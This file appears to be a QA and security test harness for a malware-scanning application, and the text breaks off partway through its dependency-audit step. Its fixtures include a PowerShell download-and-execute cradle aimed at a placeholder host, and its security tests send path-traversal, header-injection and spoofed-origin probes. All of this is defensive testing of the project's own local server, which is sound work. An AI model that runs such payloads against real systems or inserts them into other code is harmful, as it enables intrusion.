"""CyberScan NextGen - independent QA / benchmark / security harness.

Agent 3 (QA). Non-invasive: this file only *imports* the application and drives it
through its public entry points. It writes nothing into tracked project paths; all
outputs go to qa/artifacts/.

Usage
-----
    .venv\\Scripts\\python.exe qa\\qa_harness.py functional
    .venv\\Scripts\\python.exe qa\\qa_harness.py bench
    .venv\\Scripts\\python.exe qa\\qa_harness.py security
    .venv\\Scripts\\python.exe qa\\qa_harness.py all
"""
from __future__ import annotations

import json
import os
import platform
import random
import shutil
import statistics
import sys
import time
import traceback
import uuid
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path[:0] = [str(ROOT), str(ROOT / "web_v")]

ARTIFACTS = Path(__file__).resolve().parent / "artifacts"
FIXTURES = ARTIFACTS / "fixtures"
ARTIFACTS.mkdir(parents=True, exist_ok=True)
FIXTURES.mkdir(parents=True, exist_ok=True)

RESULT_LOG: list[dict] = []


# --------------------------------------------------------------------------- util
def record(test_id: str, area: str, case: str, expected: str, fn) -> dict:
    """Run one case, capture outcome, timing and error. Never raises."""
    started = time.perf_counter()
    outcome, detail, extra = "PASS", "", {}
    try:
        value = fn()
        if isinstance(value, dict):
            extra = value
            outcome = value.pop("_outcome", "PASS")
            detail = value.pop("_detail", "")
        else:
            detail = "" if value is None else str(value)
    except AssertionError as exc:
        outcome, detail = "FAIL", f"AssertionError: {exc}"
    except Exception as exc:  # noqa: BLE001 - the point is to record failures
        outcome, detail = "ERROR", f"{type(exc).__name__}: {exc}"
        extra = {"traceback": traceback.format_exc(limit=6)}
    elapsed = round((time.perf_counter() - started) * 1000, 2)
    row = {"id": test_id, "area": area, "case": case, "expected": expected,
           "outcome": outcome, "detail": detail, "elapsed_ms": elapsed, **extra}
    RESULT_LOG.append(row)
    status = {"PASS": "ok  ", "FAIL": "FAIL", "ERROR": "ERR "}[outcome]
    print(f"[{status}] {test_id:<10} {case[:58]:<58} {elapsed:>9.1f} ms  {detail[:90]}", flush=True)
    return row


def write_json(name: str, payload) -> Path:
    path = ARTIFACTS / name
    path.write_text(json.dumps(payload, indent=2, ensure_ascii=False, default=str), encoding="utf-8")
    return path


def environment() -> dict:
    import importlib.metadata as md

    def version(pkg: str) -> str:
        try:
            return md.version(pkg)
        except Exception:  # noqa: BLE001
            return "n/a"

    return {
        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "hostname": platform.node(),
        "os": platform.platform(),
        "python": sys.version.split()[0],
        "implementation": platform.python_implementation(),
        "cpu_count_logical": os.cpu_count(),
        "packages": {p: version(p) for p in
                     ("numpy", "scikit-learn", "capstone", "pefile", "yara-python", "yara-x",
                      "cryptography", "aiohttp", "pandas", "pytest", "PySide6-Essentials")},
        "git_branch": _git("rev-parse --abbrev-ref HEAD"),
        "git_head": _git("rev-parse --short HEAD"),
    }


def _git(args: str) -> str:
    import subprocess
    try:
        out = subprocess.run(["git", *args.split()], cwd=ROOT, capture_output=True, text=True, timeout=20)
        return out.stdout.strip()
    except Exception:  # noqa: BLE001
        return "n/a"


# --------------------------------------------------------------------------- fixtures
def fixture_zero() -> Path:
    p = FIXTURES / "zero.bin"
    p.write_bytes(b"")
    return p


def fixture_tiny_text() -> Path:
    p = FIXTURES / "note.txt"
    p.write_text("hello world\n", encoding="utf-8")
    return p


def fixture_repetitive() -> Path:
    p = FIXTURES / "repetitive.bin"
    p.write_bytes(b"\x00" * (256 * 1024))
    return p


def fixture_random(size: int) -> Path:
    p = FIXTURES / f"random_{size}.bin"
    if not p.exists() or p.stat().st_size != size:
        rng = random.Random(0xC5)
        p.write_bytes(rng.randbytes(size))
    return p


def fixture_truncated_pe() -> Path:
    """An MZ header with a broken e_lfanew: must not crash the PE/CFG path."""
    p = FIXTURES / "truncated_pe.bin"
    data = bytearray(b"MZ" + b"\x00" * 58)
    data[0x3C:0x40] = (0xFFFFFF).to_bytes(4, "little")   # e_lfanew far past EOF
    p.write_bytes(bytes(data))
    return p


def fixture_unicode_name() -> Path:
    p = FIXTURES / "\u0645\u0644\u0641-\u30c6\u30b9\u30c8-ñ.bin"
    p.write_bytes(b"\x90" * 4096)
    return p


def fixture_long_name() -> Path:
    p = FIXTURES / (("A" * 200) + ".bin")
    p.write_bytes(b"\x41" * 1024)
    return p


def fixture_eicar() -> Path:
    """The industry-standard EICAR anti-malware TEST string - harmless by definition."""
    p = FIXTURES / "eicar.com"
    p.write_bytes(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    return p


def fixture_powershell_text() -> Path:
    p = FIXTURES / "script.ps1"
    p.write_text("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\n", encoding="utf-8")
    return p


FIXTURE_MAP = {
    "zero_byte": fixture_zero,
    "tiny_text": fixture_tiny_text,
    "repetitive": fixture_repetitive,
    "truncated_pe": fixture_truncated_pe,
    "unicode_name": fixture_unicode_name,
    "long_name": fixture_long_name,
    "eicar_test_string": fixture_eicar,
    "powershell_text": fixture_powershell_text,
}


# --------------------------------------------------------------------------- functional
def run_functional() -> None:
    from core.scanner import scan_target
    from ui.scan_service import ScanService
    from config import DEFAULT_SETTINGS

    settings = dict(DEFAULT_SETTINGS)

    def scan_file(path: Path, **over):
        s = {**settings, **over}
        return ScanService().analyze(str(path), "File", s)

    # -- baseline scan of every fixture -------------------------------------
    for name, maker in FIXTURE_MAP.items():
        path = maker()

        def case(path=path):
            result, nextgen, vector, prediction, intel, raw = scan_file(path)
            assert isinstance(result.combined_score, int), "score must be int"
            assert 0 <= result.combined_score <= 100, f"score out of range: {result.combined_score}"
            assert result.classification in {"SUSPICIOUS", "REVIEW", "NO_INDICATORS_OBSERVED"}, result.classification
            assert nextgen["status"] == "SUCCESS"
            assert len(vector) == 4096, f"vector dim {len(vector)}"
            return {"_detail": f"score={result.combined_score} class={result.classification} bytes={len(raw)} "
                               f"evidence={len(result.evidence)}"}

        record(f"F-{list(FIXTURE_MAP).index(name)+1:02d}", "functional", f"scan file: {name}", "no crash, bounded score", case)

    # -- determinism: same bytes -> same score/vector ------------------------
    def determinism():
        path = fixture_random(64 * 1024)
        a = scan_file(path)
        b = scan_file(path)
        assert a[0].combined_score == b[0].combined_score, "score not deterministic"
        assert list(a[2]) == list(b[2]), "4096-D vector not deterministic"
        return {"_detail": f"score={a[0].combined_score} vector identical"}

    record("F-10", "functional", "repeatability: same file twice -> identical score + vector", "identical", determinism)

    # -- text and URL inputs -------------------------------------------------
    def text_input():
        result, nextgen, *_ = ScanService().analyze("just some ordinary words in a sentence", "Text", settings)
        assert nextgen["input_profile"] == "text-content"
        assert len(nextgen["entropy_topography"]["trajectory"]) >= 0
        return {"_detail": f"score={result.combined_score}"}

    record("F-11", "functional", "text input accepted", "text profile", text_input)

    def url_valid():
        result, *_ = ScanService().analyze("https://example.com/path?q=1", "URL", settings)
        assert result.classification in {"SUSPICIOUS", "REVIEW", "NO_INDICATORS_OBSERVED"}
        return {"_detail": f"score={result.combined_score}"}

    record("F-12", "functional", "valid URL accepted", "result produced", url_valid)

    def url_malformed():
        result, *_ = ScanService().analyze("ht!tp://////", "URL", settings)
        return {"_detail": f"score={result.combined_score} (no crash)"}

    record("F-13", "functional", "malformed URL -> no crash", "graceful", url_malformed)

    def empty_text():
        try:
            ScanService().analyze("", "Text", settings)
        except Exception as exc:  # noqa: BLE001
            return {"_outcome": "PASS", "_detail": f"rejected with {type(exc).__name__}"}
        return {"_outcome": "FAIL", "_detail": "empty text accepted silently (API rejects it; service does not)"}

    record("F-14", "functional", "empty text input", "explicit rejection", empty_text)

    def long_text():
        big = "A" * 200_000
        result, nextgen, *_ = ScanService().analyze(big, "Text", settings)
        assert nextgen["file_size"] == 200_000
        return {"_detail": f"accepted {nextgen['file_size']} chars"}

    record("F-15", "functional", "200k-char text", "accepted, bounded", long_text)

    def unicode_text():
        sample = "Съешь же ещё этих мягких французских булок ﷽ \U0001F600 \u202e"
        result, nextgen, *_ = ScanService().analyze(sample, "Text", settings)
        assert nextgen["file_size"] == len(sample.encode("utf-8"))
        return {"_detail": f"bytes={nextgen['file_size']}"}

    record("F-16", "functional", "Unicode/RTL/bidi text", "byte length correct", unicode_text)

    # -- size limit enforcement ---------------------------------------------
    def oversize():
        path = fixture_random(256 * 1024)
        try:
            scan_file(path, maximum_file_size=128 * 1024)
        except ValueError as exc:
            assert "exceeds" in str(exc)
            return {"_outcome": "PASS", "_detail": "ValueError raised"}
        return {"_outcome": "FAIL", "_detail": "oversize file was not rejected"}

    record("F-17", "functional", "file above maximum_file_size", "ValueError", oversize)

    # -- timeout validation ---------------------------------------------------
    def bad_timeout():
        for bad in (0, -1, float("nan"), float("inf")):
            try:
                ScanService().analyze("x", "Text", {**settings, "analysis_timeout": bad})
            except ValueError:
                continue
            raise AssertionError(f"timeout={bad!r} accepted")
        return {"_detail": "0/-1/NaN/inf all rejected"}

    record("F-18", "functional", "invalid analysis_timeout values", "ValueError each", bad_timeout)

    # -- missing file ---------------------------------------------------------
    def missing_file():
        try:
            result, *_ = ScanService().analyze(str(FIXTURES / "does_not_exist.bin"), "File", settings)
        except FileNotFoundError as exc:
            return {"_outcome": "PASS", "_detail": f"rejected with {type(exc).__name__}"}
        return {"_outcome": "FAIL", "_detail": "missing file silently treated as text scan "
                                                f"(mode=File, class={result.classification})"}

    record("F-19", "functional", "File mode with nonexistent path", "explicit error", missing_file)

    # -- zero-byte special check ---------------------------------------------
    def zero_bytes():
        path = fixture_zero()
        result, nextgen, vector, *_ = scan_file(path)
        assert nextgen["file_size"] == 0
        assert len(vector) == 4096
        return {"_detail": f"score={result.combined_score} class={result.classification}"}

    record("F-20", "functional", "zero-byte file: full pipeline completes", "no crash", zero_bytes)


# --------------------------------------------------------------------------- benchmark
def _latency_stats(samples: list[float]) -> dict:
    if not samples:
        return {}
    s = sorted(samples)
    def pct(p: float) -> float:
        if len(s) == 1:
            return s[0]
        k = (len(s) - 1) * p
        lo, hi = int(k), min(int(k) + 1, len(s) - 1)
        return s[lo] + (s[hi] - s[lo]) * (k - lo)
    return {
        "n": len(s), "min_ms": round(s[0], 2), "mean_ms": round(statistics.fmean(s), 2),
        "median_ms": round(pct(0.5), 2), "p90_ms": round(pct(0.90), 2),
        "p95_ms": round(pct(0.95), 2), "p99_ms": round(pct(0.99), 2), "max_ms": round(s[-1], 2),
        "stdev_ms": round(statistics.stdev(s), 2) if len(s) > 1 else 0.0,
    }


def _cpu_and_mem(fn):
    """Run fn() and return (result, wall_ms, cpu_ms, peak_delta_rss_mb)."""
    import threading
    import tracemalloc

    p = _psutil()
    proc = p.Process()
    cpu0 = proc.cpu_times()
    rss0 = proc.memory_info().rss
    peak = {"rss": rss0}
    stop = threading.Event()

    def watch():
        while not stop.is_set():
            peak["rss"] = max(peak["rss"], proc.memory_info().rss)
            stop.wait(0.01)

    watcher = threading.Thread(target=watch, daemon=True)
    watcher.start()
    t0 = time.perf_counter()
    out = fn()
    wall = (time.perf_counter() - t0) * 1000
    stop.set()
    watcher.join(timeout=1)
    cpu1 = proc.cpu_times()
    cpu_ms = ((cpu1.user - cpu0.user) + (cpu1.system - cpu0.system)) * 1000
    return out, wall, cpu_ms, (peak["rss"] - rss0) / (1024 * 1024), peak["rss"] / (1024 * 1024)


def _psutil():
    try:
        import psutil
        return psutil
    except ImportError:
        raise SystemExit("psutil is required for benchmarking: .venv\\Scripts\\python.exe -m pip install psutil")


SIZES = [1 * 1024, 16 * 1024, 256 * 1024, 1024 * 1024, 4 * 1024 * 1024, 8 * 1024 * 1024]
REPEATS = 7
NATIVE_REPEATS = 2     # the native stage alone is the expensive one; 2 reps keep the run bounded


def run_bench() -> None:
    from ui.scan_service import ScanService
    from core.scanner import scan_target
    from config import DEFAULT_SETTINGS

    settings = dict(DEFAULT_SETTINGS)
    report = {"environment": environment(), "sizes": {}, "stages": {}, "osint": {}, "concurrency": {}}

    print("\n== warm-up ==")
    warm = fixture_random(256 * 1024)
    for _ in range(2):
        ScanService().analyze(str(warm), "File", settings)

    print("\n== end-to-end file scan latency by size ==")
    for size in SIZES:
        path = fixture_random(size)
        g = path.read_bytes()          # pre-read so disk I/O is excluded from the scan timing
        samples, cpus, mems = [], [], []
        for _ in range(REPEATS):
            _, wall, cpu, mem, _peak = _cpu_and_mem(lambda: ScanService().analyze(str(path), "File", settings))
            samples.append(wall)
            cpus.append(cpu)
            mems.append(mem)
        stats = _latency_stats(samples)
        stats.update({
            "bytes": size, "repeats": REPEATS,
            "cpu_ms_mean": round(statistics.fmean(cpus), 2),
            "cpu_ratio": round(statistics.fmean(cpus) / statistics.fmean(samples), 3),
            "rss_delta_mb_peak": round(max(mems), 1),
            "rss_ratio_vs_input": round(max(mems) * 1024 * 1024 / size, 2),
            "throughput_mb_s": round((size / (1024 * 1024)) / (stats["median_ms"] / 1000), 2),
        })
        report["sizes"][str(size)] = stats
        print(f"  {size/1024:>8.0f} KiB  median {stats['median_ms']:>9.1f} ms  p95 {stats['p95_ms']:>9.1f} ms  "
              f"cpu {stats['cpu_ratio']*100:>5.1f}%  rss+{stats['rss_delta_mb_peak']:>6.1f} MB  "
              f"{stats['throughput_mb_s']:>6.2f} MB/s")

    print("\n== per-stage breakdown (4 MiB random, median of 7) ==")
    path = fixture_random(4 * 1024 * 1024)
    raw = path.read_bytes()
    stage_samples: dict[str, list[float]] = {k: [] for k in
        ("stage0_scan_target", "stage1_entropy", "stage2_embedding", "stage3_osint_disabled", "total")}

    def timed(fn):
        t = time.perf_counter()
        r = fn()
        return r, (time.perf_counter() - t) * 1000

    for _ in range(REPEATS):
        _, total = timed(lambda: ScanService().analyze(str(path), "File", settings))
        stage_samples["total"].append(total)
        _, s0 = timed(lambda: scan_target(str(path), is_file=True, settings=settings, file_data=raw))
        from core.nextgen_engine import NextGenCyberEngine
        _, s1 = timed(lambda: NextGenCyberEngine.analyze_entropy_topography(raw))
        mz = b"MZ" + b"\x00" * 62 + b"\x40\x00\x00\x00"   # minimal MZ header, CFG path exercised
        _, s2 = timed(lambda: NextGenCyberEngine.extract_cfg_topology(mz + b"\x00" * (len(raw) - 64)))
        stage_samples["stage0_scan_target"].append(s0)
        stage_samples["stage1_entropy"].append(s1)
        stage_samples["stage2_embedding"].append(s2)
    for k, v in stage_samples.items():
        if v:
            report["stages"][k] = _latency_stats(v)
            print(f"  {k:<26} median {_latency_stats(v)['median_ms']:>9.1f} ms")

    print("\n== native pipeline only (scan_target: YARA + PE + heuristics), by size ==")
    native = {}
    for size in SIZES:
        data = fixture_random(size).read_bytes()
        samples = []
        for _ in range(NATIVE_REPEATS):
            _, wall = timed(lambda: scan_target("x.bin", is_file=True, settings=settings, file_data=data))
            samples.append(wall)
            print(f"    rep {len(samples)}/{NATIVE_REPEATS}: {wall:.0f} ms", flush=True)
        native[str(size)] = _latency_stats(samples)
        print(f"  {size/1024:>8.0f} KiB  median {native[str(size)]['median_ms']:>9.1f} ms")
    report["native_scan_target"] = native

    # Persist what we have before the network-dependent phases, so a later
    # interruption never costs the measurements already taken.
    write_json("benchmark_results.json", report)

    print("\n== OSINT correlation: the 1.5 s claim ==", flush=True)
    report["osint"] = osint_benchmarks()
    write_json("benchmark_results.json", report)

    print("\n== concurrency: N parallel scans of 1 MiB ==", flush=True)
    report["concurrency"] = concurrency_benchmarks()
    write_json("benchmark_results.json", report)

    print("\n== web API latency (real HTTP server) ==", flush=True)
    report["http_api"] = http_benchmarks()

    write_json("benchmark_results.json", report)
    print("\nwrote qa/artifacts/benchmark_results.json", flush=True)


def osint_benchmarks() -> dict:
    import asyncio
    from core.global_intelligence import GlobalIntelligenceEngine
    from unittest import mock

    out = {"claim": "sub-1.5-second correlation performance", "measurements": {}}

    indicators = {
        "sha256_unknown": "a" * 64,
        "domain": "example.com",
        "url": "https://example.com/login",
        "invalid": "not an indicator",
    }

    for label, ind in indicators.items():
        samples, elapsed_reported, statuses = [], [], []
        for _ in range(3):
            GlobalIntelligenceEngine._shared_cache.clear()
            t0 = time.perf_counter()
            res = asyncio.run(GlobalIntelligenceEngine().query_indicator(ind))
            samples.append((time.perf_counter() - t0) * 1000)
            elapsed_reported.append(res.get("elapsed_ms"))
            statuses.append(res.get("status"))
        out["measurements"][label] = {
            "wall": _latency_stats(samples),
            "self_reported_elapsed_ms": elapsed_reported,
            "status": statuses,
            "feed_states": res.get("feeds"),
        }
        st = _latency_stats(samples)
        print(f"  {label:<16} median {st['median_ms']:>8.1f} ms  p95 {st['p95_ms']:>8.1f} ms  status={statuses[0]}")

    # cache-hit path
    GlobalIntelligenceEngine._shared_cache.clear()
    asyncio.run(GlobalIntelligenceEngine().query_indicator("example.com"))
    hits = []
    for _ in range(10):
        t0 = time.perf_counter()
        asyncio.run(GlobalIntelligenceEngine().query_indicator("example.com"))
        hits.append((time.perf_counter() - t0) * 1000)
    out["measurements"]["cache_hit"] = _latency_stats(hits)
    print(f"  {'cache_hit':<16} median {out['measurements']['cache_hit']['median_ms']:>8.1f} ms")

    # what a *fully responsive* feed set would look like (mocked fast responses)
    async def fake_feed(*_a, **_k):
        await asyncio.sleep(0.01)
        return GlobalIntelligenceEngine._feed_result("no_match")

    with mock.patch.object(GlobalIntelligenceEngine, "_query_threatfox", side_effect=fake_feed), \
         mock.patch.object(GlobalIntelligenceEngine, "_query_urlhaus", side_effect=fake_feed), \
         mock.patch.object(GlobalIntelligenceEngine, "_query_otx", side_effect=fake_feed):
        GlobalIntelligenceEngine._shared_cache.clear()
        sim = []
        for _ in range(10):
            GlobalIntelligenceEngine._shared_cache.clear()
            t0 = time.perf_counter()
            asyncio.run(GlobalIntelligenceEngine().query_indicator("b" * 64))
            sim.append((time.perf_counter() - t0) * 1000)
    out["simulated_responsive_feeds"] = {**_latency_stats(sim),
                                         "note": "mocked 10 ms feed responses - NOT a real network measurement"}
    print(f"  {'simulated_feeds':<16} median {out['simulated_responsive_feeds']['median_ms']:>8.1f} ms (mocked)")

    out["code_facts"] = {
        "per_feed_timeout_s": GlobalIntelligenceEngine.MAX_FAST_FEED_TIMEOUT_SECONDS,
        "overall_deadline_s": GlobalIntelligenceEngine().total_timeout_seconds,
        "cache_ttl_s": GlobalIntelligenceEngine.CACHE_TTL_SECONDS,
    }
    return out


def concurrency_benchmarks() -> dict:
    from concurrent.futures import ThreadPoolExecutor
    from ui.scan_service import ScanService
    from config import DEFAULT_SETTINGS

    settings = dict(DEFAULT_SETTINGS)
    path = fixture_random(1024 * 1024)
    out = {}
    # sequential reference
    seq = []
    svc = ScanService()
    for _ in range(8):
        t0 = time.perf_counter()
        svc.analyze(str(path), "File", settings)
        seq.append((time.perf_counter() - t0) * 1000)
    out["sequential_8"] = _latency_stats(seq)
    for workers in (2, 4, 8, 16):
        t0 = time.perf_counter()
        failures = 0

        def one(_i, svc=svc):
            nonlocal failures
            try:
                svc.analyze(str(path), "File", settings)
            except Exception:  # noqa: BLE001
                failures += 1

        with ThreadPoolExecutor(max_workers=workers) as pool:
            list(pool.map(one, range(8)))
        total = (time.perf_counter() - t0) * 1000
        out[f"parallel_{workers}x8"] = {"wall_ms": round(total, 1), "failures": failures,
                                        "per_scan_ms": round(total / 8, 1),
                                        "speedup_vs_seq": round(out["sequential_8"]["median_ms"] * 8 / total, 2)}
        print(f"  {workers:>2} workers x 8 scans  wall {total:>9.1f} ms  per-scan {total/8:>8.1f} ms  failures {failures}")
    return out


def http_benchmarks() -> dict:
    """Real HTTP against web_v/server.py on a free port, using only public API routes."""
    import http.client
    import threading
    import json as _json

    from server import create_server, cleanup

    server, app = create_server(0)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    token = app.token
    base = {"Host": f"127.0.0.1:{port}", "X-CyberScan-Token": token}
    out = {"port": port, "endpoints": {}}

    def req(method, path, body=None, extra=None):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=180)
        headers = dict(base)
        if extra:
            headers.update(extra)
        payload = b""
        if body is not None:
            payload = body if isinstance(body, bytes) else _json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=payload, headers=headers)
        r = conn.getresponse()
        data = r.read()
        conn.close()
        return r.status, data

    try:
        # static assets
        for asset in ("/", "/app.html", "/static/styles.css", "/static/app.js"):
            samples = []
            for _ in range(5):
                t0 = time.perf_counter()
                status, data = req("GET", asset)
                samples.append((time.perf_counter() - t0) * 1000)
            out["endpoints"][f"GET {asset}"] = {**_latency_stats(samples), "status": status, "bytes": len(data)}
            print(f"  GET {asset:<26} median {_latency_stats(samples)['median_ms']:>8.1f} ms  {len(data):>7} B")

        # text scan end-to-end (submit + poll)
        path = fixture_random(256 * 1024)
        samples = []
        for _ in range(5):
            t0 = time.perf_counter()
            status, data = req("POST", "/api/scan", {"mode": "text", "value": "hello world " * 500})
            job = _json.loads(data)["id"]
            while True:
                st, d = req("GET", f"/api/scan/{job}")
                if _json.loads(d)["status"] != "running":
                    break
                time.sleep(0.01)
            samples.append((time.perf_counter() - t0) * 1000)
        out["endpoints"]["POST /api/scan (text, e2e)"] = _latency_stats(samples)
        print(f"  POST /api/scan (text e2e)     median {_latency_stats(samples)['median_ms']:>8.1f} ms")

        # upload scan end-to-end at several sizes
        for size in (64 * 1024, 1024 * 1024, 4 * 1024 * 1024):
            blob = fixture_random(size).read_bytes()
            samples = []
            for _ in range(3):
                t0 = time.perf_counter()
                status, data = req("POST", "/api/scan/file", blob, {"X-Filename": "u.bin",
                                                                   "Content-Type": "application/octet-stream"})
                job = _json.loads(data)["id"]
                while True:
                    st, d = req("GET", f"/api/scan/{job}")
                    if _json.loads(d)["status"] != "running":
                        break
                    time.sleep(0.01)
                samples.append((time.perf_counter() - t0) * 1000)
            out["endpoints"][f"POST /api/scan/file {size//1024}KiB"] = {**_latency_stats(samples), "status": status}
            print(f"  POST /api/scan/file {size//1024:>5}KiB   median {_latency_stats(samples)['median_ms']:>8.1f} ms")

        # simple GET API
        for ep in ("/api/settings", "/api/history", "/api/stats"):
            samples = []
            for _ in range(5):
                t0 = time.perf_counter()
                status, data = req("GET", ep)
                samples.append((time.perf_counter() - t0) * 1000)
            out["endpoints"][f"GET {ep}"] = {**_latency_stats(samples), "status": status}
            print(f"  GET {ep:<26} median {_latency_stats(samples)['median_ms']:>8.1f} ms")
    finally:
        server.shutdown()
        server.server_close()
        cleanup(app)
    return out


# --------------------------------------------------------------------------- security
def run_security() -> None:
    import http.client
    import threading
    from server import create_server, cleanup

    findings = []

    def add(fid, title, severity, evidence, repro, impact, fix):
        findings.append({"id": fid, "title": title, "severity": severity, "evidence": evidence,
                         "reproduction": repro, "impact": impact, "remediation": fix})
        print(f"[{severity:<8}] {fid} {title}")

    server, app = create_server(0)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    token = app.token

    def raw(method, path, body=b"", headers=None, host=None):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
        h = {"Host": host or f"127.0.0.1:{port}", "X-CyberScan-Token": token}
        if headers:
            h.update(headers)
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        data = r.read()
        conn.close()
        return r.status, data, dict(r.getheaders())

    try:
        # S1: token exposure in page HTML (origin of the CSRF token)
        status, page, _ = raw("GET", "/")
        token_in_page = token.encode() in page
        record("S-01", "security", "defence-in-depth token embedded in page source",
               "informational", lambda: {"_detail": f"token in index.html: {token_in_page}"})

        # S2: path traversal on static
        for probe in ("/../../config.py", "/static/../../config.py", "/%2e%2e/%2e%2e/config.py",
                      "/..%5c..%5cconfig.py", "/static/..%2f..%2fconfig.py"):
            s, d, _ = raw("GET", probe)
            leaked = b"ROOT_DIR" in d or b"MAX_FILE_SIZE" in d
            record(f"S-02{probe[:3]}", "security", f"path traversal {probe}", "no source leak",
                   lambda s=s, leaked=leaked: ({"_outcome": "FAIL" if leaked else "PASS",
                                                "_detail": f"status={s} leaked={leaked}"}))

        # S3: requires token?
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        conn.request("GET", "/api/history", headers={"Host": f"127.0.0.1:{port}"})
        r = conn.getresponse(); body = r.read(); conn.close()
        record("S-03", "security", "API without token", "401", lambda: {"_outcome": "PASS" if r.status == 401 else "FAIL",
                                                                       "_detail": f"status={r.status}"})

        # S4: Host header validation (DNS rebinding defence)
        s, d, _ = raw("GET", "/api/settings", host="evil.example.com")
        record("S-04", "security", "bad Host header rejected", "403", lambda: {"_outcome": "PASS" if s == 403 else "FAIL",
                                                                              "_detail": f"status={s}"})
        s, d, _ = raw("GET", "/", host="evil.example.com")
        record("S-04b", "security", "bad Host on static page rejected", "403",
               lambda: {"_outcome": "PASS" if s == 403 else "FAIL", "_detail": f"status={s}"})

        # S5: Origin header
        s, d, _ = raw("POST", "/api/scan", body=json_bytes({"mode": "text", "value": "x"}),
                      headers={"Origin": "http://evil.example.com"})
        record("S-05", "security", "cross-origin POST rejected", "403",
               lambda: {"_outcome": "PASS" if s == 403 else "FAIL", "_detail": f"status={s}"})

        # S6: body size limit
        s, d, _ = raw("POST", "/api/scan", body=b"x" * (2 * 1024 * 1024))
        record("S-06", "security", "2 MiB JSON body rejected", "413",
               lambda: {"_outcome": "PASS" if s == 413 else "FAIL", "_detail": f"status={s}"})

        # S7: Content-Length mismatch / negative
        s, d, _ = raw("POST", "/api/scan", body=b"{}", headers={"Content-Length": "-5"})
        record("S-07", "security", "negative Content-Length", "4xx, no hang",
               lambda: {"_outcome": "PASS" if 400 <= s < 500 else "FAIL", "_detail": f"status={s}"})

        # S8: filename sanitisation on upload
        evil = "../../../evil.txt"
        s, d, _ = raw("POST", "/api/scan/file", b"hello", headers={"X-Filename": evil,
                                                                   "Content-Type": "application/octet-stream"})
        escaped = (app.upload_root.parent / "evil.txt").exists()
        record("S-08", "security", "upload filename traversal", "contained in temp dir",
               lambda: {"_outcome": "FAIL" if escaped else "PASS", "_detail": f"status={s} escaped={escaped}"})

        # S9: prototype-pollution-ish / type confusion in settings
        for bad in ('{"maximum_file_size": true}', '{"ml_weight": "1e9"}', '{"maximum_file_size": 1e308}'):
            s, d, _ = raw("PUT", "/api/settings", body=bad.encode())
            record(f"S-09{len(bad)}", "security", f"settings type confusion {bad[:40]}", "400",
                   lambda s=s, d=d: {"_outcome": "PASS" if s in (400, 422) else "FAIL",
                                     "_detail": f"status={s} body={d[:80]!r}"})

        # S10: Unicode filename normalisation and control chars
        s, d, _ = raw("POST", "/api/scan/file", b"abc", headers={"X-Filename": "\u0000\r\nInjected: x\r\n\r\n"})
        record("S-10", "security", "header-injection in X-Filename", "reflected safely",
               lambda: {"_outcome": "PASS" if s in (200, 202, 400) else "FAIL", "_detail": f"status={s}"})

        # S11: error message leakage
        s, d, _ = raw("POST", "/api/scan", body=b'{"mode":"path","value":"C:\\\\nonexistent\\\\x.bin"}')
        leaks_path = b"Traceback" in d or b"site-packages" in d
        record("S-11", "security", "stack traces / internals in error body", "no leakage",
               lambda: {"_outcome": "FAIL" if leaks_path else "PASS", "_detail": f"body={d[:120]!r}"})

        # S12: security headers
        _, _, hdrs = raw("GET", "/")
        needed = ["Content-Security-Policy", "X-Content-Type-Options", "Referrer-Policy"]
        missing = [n for n in needed if n not in hdrs]
        record("S-12", "security", "security headers present", "CSP/nosniff/referrer",
               lambda: {"_outcome": "PASS" if not missing else "FAIL", "_detail": f"missing={missing}"})

        # S13: unpickling / model artifact safety is tested by repo tests; re-verify json loader here
        record("S-13", "security", "classifier uses validated JSON (no joblib.load in active path)",
               "no executable deserialisation",
               lambda: _grep_no_joblib())

        # S14: quarantine gating
        from core.scanner import quarantine_file
        p = FIXTURES / "quarantine_probe.bin"
        p.write_bytes(b"probe")
        qdir = ARTIFACTS / "qdir"
        qdir.mkdir(exist_ok=True)
        res = quarantine_file(p, b"k" * 32, qdir)
        still_there = p.exists()
        sealed = sorted(x.name for x in qdir.glob("*.csq"))
        record("S-14", "security", "quarantine defaults to dry-run (file kept)",
               "file retained, nothing written",
               lambda: {"_outcome": "PASS" if still_there and res is None else "FAIL",
                        "_detail": f"returned={res!r} retained={still_there} csq_files={len(sealed)}"})
        try:
            quarantine_file(p, b"short", qdir, dry_run=False, authorized=True)
            record("S-15", "security", "short AES key rejected", "ValueError",
                   lambda: {"_outcome": "FAIL", "_detail": "weak key accepted"})
        except ValueError:
            record("S-15", "security", "short AES key rejected", "ValueError", lambda: {"_detail": "rejected"})
        try:
            quarantine_file(p, b"k" * 32, qdir, dry_run=False)  # authorized=False
            kept = p.exists()
            record("S-16", "security", "deletion without authorization refused", "source kept",
                   lambda: {"_outcome": "PASS" if kept else "FAIL", "_detail": f"kept={kept}"})
        finally:
            p.unlink(missing_ok=True)

        # S17: dependency audit
        record("S-17", "security", "dependency vulnerability scan", "pip-audit",
               lambda: _pip_audit())

    finally:
        server.shutdown()
        server.server_close()
        cleanup(app)

    write_json("security_findings.json", findings)


def json_bytes(obj) -> bytes:
    import json as _j
    return _j.dumps(obj).encode()


def _grep_no_joblib() -> dict:
    hits = []
    for f in (ROOT / "ml").rglob("*.py"):
        text = f.read_text(encoding="utf-8", errors="ignore")
        if "joblib.load" in text:
            hits.append(str(f.relative_to(ROOT)))
    return {"_outcome": "PASS" if not hits else "FAIL", "_detail": f"joblib.load in: {hits}"}


def _pip_audit() -> dict:
    import subprocess
    try:
        out = subprocess.run([sys.executable, "-m", "pip_audit", "--format", "json", "-r",
                              str(ROOT / "requirements.txt")],
                             capture_output=True, text=True, timeout=300)
    except Exception as exc:  # noqa: BLE001
        return {"_outcome": "SKIP", "_detail": f"pip-audit unavailable: {exc}"}
    raw = out.stdout.strip()
    if out.returncode not in (0, 1) or not raw:
        return {"_outcome": "SKIP", "_detail": f"pip-audit rc={out.returncode} {out.stderr[-200:]}"}
    try:
